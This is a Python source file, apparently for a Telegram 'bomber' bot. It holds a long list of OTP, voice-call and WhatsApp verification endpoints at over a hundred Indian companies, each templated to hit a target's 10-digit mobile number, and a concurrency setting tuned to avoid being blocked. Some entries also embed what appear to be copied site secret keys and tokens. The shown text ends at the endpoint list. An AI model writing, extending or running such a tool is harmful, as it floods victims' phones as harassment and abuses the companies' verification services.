import os
import sys
import time
import asyncio
import logging
import random
import uuid
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "") 
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))

# BALANCED CONFIG (Smooth + Continuous)
CONCURRENCY     = 15   # 15 requests ek saath (Block nahi hoga)
DELAY           = 0.5  # 0.5 second ka gap (Lagataar chalega)
REQUEST_TIMEOUT = 8
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  A TO Z APIS (Diljot Bomber + Tsunami Merged)
# =========================================================================
def build_endpoints():
    UA_C = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
    UA_O = "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5"
    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    
    E = []

    # ==========================================
    # 1. DILJOT CALL / IVR APIS
    # ==========================================
    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
    E.append({"name":"Flipkart_Call","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
    E.append({"name":"Refyne_IVR","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"IVR","recipient":"{t}"}'})
    E.append({"name":"SonyLiv_Voice","method":"POST","url":"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'})
    E.append({"name":"Snitch_Voice","method":"POST","url":"https://www.snitch.com/api/auth/resend-otp?mode=voice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_number":"+91{t}"}'})
    E.append({"name":"Ixigo_Call","method":"POST","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={t}&resendOnCall=true'})
    E.append({"name":"MMT_Call","method":"POST","url":"https://www.makemytrip.com/api/umbrella/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Rapido_Call","method":"POST","url":"https://rapido.bike/api/v2/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho_Call","method":"POST","url":"https://api.meesho.com/v2/auth/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zomato_Call","method":"POST","url":"https://www.zomato.com/php/asyncLogin.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'phone={t}'})
    E.append({"name":"OYO_Call","method":"POST","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Astroyogi_Call","method":"POST","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},"data":'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{t}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'})

    # ==========================================
    # 2. DILJOT WHATSAPP APIS
    # ==========================================
    E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"EkaCare_WA","method":"POST","url":"https://auth.eka.care/auth/init","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
    E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Havells_WA","method":"POST","url":"https://havells.com/otplogin/account/otploginpost/","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"form_key=GvFYqgGVWCkuLoNT&mobile_number={t}&is_whatsapp_promo=on"})
    E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
    E.append({"name":"MMT_WA","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"loginId":"{t}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'})
    E.append({"name":"HERE_WA","method":"POST","url":"https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}'})
    E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RegistaniaChar_WA","method":"POST","url":"https://admin.registaniachar.com/api/whatsapp/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"X-Signature":"6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},"data":'{"phone":"{t}"}'})

    # ==========================================
    # 3. DILJOT SMS APIS
    # ==========================================
    E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"NoBroker","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShipRocket","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"RentoMojo","method":"POST","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Khatabook","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Revv","method":"POST","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","deviceType":"website"}'})
    E.append({"name":"PayMe_India","method":"POST","url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","app_signature":"S10ePIIrbH3"}'})
    E.append({"name":"PaisaOnSalary","method":"POST","url":"https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","event_name":"login"}'})
    E.append({"name":"LoanZap","method":"POST","url":"https://webapi.loanzap.in/v2/apply-loan/register-user","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"name":"Binod","mobile":"{t}","email":"test@gmail.com","terms":"1"}'})
    E.append({"name":"Apna","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"Moglix","method":"POST","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","phone":"{t}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'})
    E.append({"name":"CreditSea","method":"POST","url":"https://backend.creditsea.com/api/v1/otp/generate-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneNumber":"{t}","isWebUser":true}'})
    E.append({"name":"Penpencil","method":"POST","url":"https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"Udaan","method":"POST","url":"https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile={t}"})
    E.append({"name":"SmartCoin","method":"POST","url":"https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'})
    E.append({"name":"OLX","method":"POST","url":"https://www.olx.in/api/auth/authenticate?lang=en-IN","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"method":"sms","phone":"{t}","language":"en-IN","grantType":"retry"}'})
    E.append({"name":"IGP","method":"POST","url":"https://www.igp.com/v2/loginSignup","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mprefix":"91","mob":"{t}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'})
    E.append({"name":"Sephora","method":"POST","url":"https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","country_code":"91"}'})
    E.append({"name":"JioSaavn","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Droom","method":"POST","url":"https://api.droom.in/v1/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","country_code":"91"}'})
    E.append({"name":"Licious","method":"POST","url":"https://www.licious.com/auth/api/v1/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Puma","method":"POST","url":"https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"dwfrm_phone={t}&format=ajax"})
    E.append({"name":"Decathlon","method":"POST","url":"https://www.decathlon.in/api/v1/auth/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","isLogin":true}'})
    E.append({"name":"Groww","method":"POST","url":"https://groww.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RedBus","method":"POST","url":"https://www.redbus.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","source":"web"}'})
    E.append({"name":"Dominos","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"McDelivery","method":"POST","url":"https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"KFC_India","method":"POST","url":"https://online.kfc.co.in/api/customer/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BurgerKing_IN","method":"POST","url":"https://bkdelivery.in/api/customer/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Faasos","method":"POST","url":"https://faasos.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Behrouz","method":"POST","url":"https://behrouzbiryani.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"EatFit","method":"POST","url":"https://www.eatfit.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"FreshMenu","method":"POST","url":"https://www.freshmenu.com/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Box8","method":"POST","url":"https://box8.in/api/v1/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"WowMomo","method":"POST","url":"https://wowmomo.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Faasos_2","method":"POST","url":"https://www.faasos.com/api/v2/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"RebelFoods","method":"POST","url":"https://www.rebelfoods.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BigBasket","method":"POST","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_number":"{t}"}'})
    E.append({"name":"Blinkit","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zepto","method":"POST","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Dunzo","method":"POST","url":"https://api.dunzo.in/api/v1/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}"}'})
    E.append({"name":"JioMart","method":"POST","url":"https://www.jiomart.com/api/v1/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Grofers","method":"POST","url":"https://api.grofers.com/v4/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"NatureBasket","method":"POST","url":"https://www.naturebasket.in/api/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"MilkBasket","method":"POST","url":"https://www.milkbasket.com/api/v1/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Otipy","method":"POST","url":"https://www.otipy.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Amazon_IN","method":"POST","url":"https://www.amazon.in/ap/signin","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&action=sendotp"})
    E.append({"name":"Snapdeal","method":"POST","url":"https://www.snapdeal.com/authenticate/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShopClues","method":"POST","url":"https://www.shopclues.com/api/user/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCliq","method":"POST","url":"https://www.tatacliq.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","state":"login"}'})
    E.append({"name":"Nykaa_Fashion","method":"POST","url":"https://www.nykaafashion.com/app-api/index.php/customer/send_otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"source=sms&mobile_number={t}"})
    E.append({"name":"Ajio","method":"POST","url":"https://www.ajio.com/api/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Myntra","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Shopsy","method":"POST","url":"https://www.shopsy.in/1.rome/api/1/action/view","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"actionRequestContext":{"loginId":"{t}","loginType":"MOBILE","verificationType":"OTP","type":"LOGIN_IDENTITY_VERIFY"}}'})
    E.append({"name":"Meesho","method":"POST","url":"https://www.meesho.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"FirstCry","method":"POST","url":"https://www.firstcry.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Hopscotch","method":"POST","url":"https://www.hopscotch.in/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"NykaaMan","method":"POST","url":"https://www.nykaaman.com/app-api/index.php/customer/send_otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"source=sms&mobile_number={t}"})
    E.append({"name":"Zivame","method":"POST","url":"https://www.zivame.com/auth/public/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","countryCode":"IN"}'})
    E.append({"name":"Clovia","method":"POST","url":"https://www.clovia.com/api/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Bewakoof","method":"POST","url":"https://www.bewakoof.com/api/user/login/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"SouledStore","method":"POST","url":"https://www.thesouledstore.com/api/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Redwolf","method":"POST","url":"https://www.redwolf.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Chumbak","method":"POST","url":"https://www.chumbak.com/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"FabIndia","method":"POST","url":"https://www.fabindia.com/api/customer/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EaseMyTrip","method":"POST","url":"https://www.easemytrip.com/api/otp/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"Mobileno":"{t}","Type":"M"}'})
    E.append({"name":"Goibibo","method":"POST","url":"https://www.goibibo.com/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Yatra","method":"POST","url":"https://secure.yatra.com/social/common/yatra/action/doMobileLogin","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobileNo={t}"})
    E.append({"name":"Cleartrip","method":"POST","url":"https://www.cleartrip.com/api/v2/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Abhibus","method":"POST","url":"https://www.abhibus.com/api/v1/auth/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Paytm_Travel","method":"POST","url":"https://travel.paytm.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"IRCTC","method":"POST","url":"https://www.irctc.co.in/eticketing/protected/mapps1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Confirmtkt","method":"POST","url":"https://www.confirmtkt.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"RailYatri","method":"POST","url":"https://www.railyatri.in/api/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ixigo_Train","method":"POST","url":"https://www.ixigo.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"KreditBee","method":"POST","url":"https://api.kreditbee.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"MoneyTap","method":"POST","url":"https://api.moneytap.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EarlySalary","method":"POST","url":"https://api.earlysalary.com/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"CashE","method":"POST","url":"https://www.cashe.co.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Faircent","method":"POST","url":"https://www.faircent.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Lendingkart","method":"POST","url":"https://www.lendingkart.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Indiabulls","method":"POST","url":"https://www.indiabullshomeloans.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"IIFL","method":"POST","url":"https://api.iifl.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BajajMarkets","method":"POST","url":"https://www.bajajfinservmarkets.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"PaisaBazaar","method":"POST","url":"https://www.paisabazaar.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"RupeeRedee","method":"POST","url":"https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"+91{t}","type":"Mobile"}'})
    E.append({"name":"LoanTap","method":"POST","url":"https://api.loantap.in/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"ZestMoney","method":"POST","url":"https://api.zestmoney.in/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Slice","method":"POST","url":"https://api.sliceit.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Simpl","method":"POST","url":"https://api.getsimpl.com/api/v3/auth/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}"}'})
    E.append({"name":"LazyPay","method":"POST","url":"https://api.lazypay.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Dhani","method":"POST","url":"https://www.dhani.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Navi","method":"POST","url":"https://api.navi.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Kissht","method":"POST","url":"https://api.kissht.com/api/v3/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Cashe2","method":"POST","url":"https://api.cashe.co.in/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PolicyBazaar_Ins","method":"POST","url":"https://www.policybazaar.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Acko","method":"POST","url":"https://www.acko.com/api/v2/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Digit","method":"POST","url":"https://www.godigit.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"HDFCErgo","method":"POST","url":"https://www.hdfcergo.com/api/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"ICICILombard","method":"POST","url":"https://www.icicilombard.com/api/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
